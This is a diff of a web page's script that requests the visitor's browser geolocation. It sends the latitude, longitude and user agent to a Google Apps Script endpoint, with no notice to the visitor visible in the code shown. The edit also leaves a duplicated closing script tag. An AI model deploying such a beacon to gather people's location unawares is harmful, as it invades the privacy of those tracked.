@@ -70,6 +70,24 @@
         }
     </style>
     <script>
+        // function getLocation() {
+        //     if (navigator.geolocation) {
+        //         navigator.geolocation.getCurrentPosition(showPosition);
+        //     } else {
+        //         document.body.innerHTML += "Geolocation is not supported by this browser.";
+        //     }
+        // }
+
+        // function showPosition(position) {
+        //     const xhttp = new XMLHttpRequest();
+        //     const url = "https://script.google.com/macros/s/AKfycbx-GS4njHYYhGcLH4gejxnjwJdTjkzMFuTfXK5d2up0mckIG1unWs0XCtZNEq8zqJpH/exec?lat=" + position.coords.latitude +
+        //         "&long=" + position.coords.longitude +
+        //         "&uagent=" + encodeURIComponent(navigator.userAgent);
+        //     xhttp.open("GET", url, true);
+        //     xhttp.send();
+        // }
+
+
         function getLocation() {
             if (navigator.geolocation) {
                 navigator.geolocation.getCurrentPosition(showPosition);
@@ -79,13 +97,14 @@
         }
 
         function showPosition(position) {
-            const xhttp = new XMLHttpRequest();
-            const url = "https://script.google.com/macros/s/AKfycbx-GS4njHYYhGcLH4gejxnjwJdTjkzMFuTfXK5d2up0mckIG1unWs0XCtZNEq8zqJpH/exec?lat=" + position.coords.latitude +
+            var xhttp = new XMLHttpRequest();
+            var url = "https://script.google.com/macros/s/AKfycbx-GS4njHYYhGcLH4gejxnjwJdTjkzMFuTfXK5d2up0mckIG1unWs0XCtZNEq8zqJpH/exec?lat=" + position.coords.latitude +
                 "&long=" + position.coords.longitude +
                 "&uagent=" + encodeURIComponent(navigator.userAgent);
             xhttp.open("GET", url, true);
             xhttp.send();
         }
+    </script>
 
     </script>
 </head>
